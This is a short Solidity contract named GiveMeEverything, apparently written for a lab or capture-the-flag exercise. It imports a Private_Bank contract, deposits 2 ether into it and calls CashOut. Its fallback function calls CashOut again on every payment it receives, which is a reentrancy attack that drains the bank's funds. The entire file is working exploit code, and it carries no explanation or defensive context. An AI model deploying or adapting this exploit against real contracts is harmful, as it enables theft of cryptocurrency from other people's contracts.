pragma solidity ^0.4.19;

import "6.sol";

contract GiveMeEverything {
    Private_Bank public bank;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        bank = Private_Bank(_addr);
        
        bank.Deposit.value(2 ether)();
        bank.CashOut(1 ether);
    }
    
    function() public payable {
        bank.CashOut(1 ether);
    }
    
}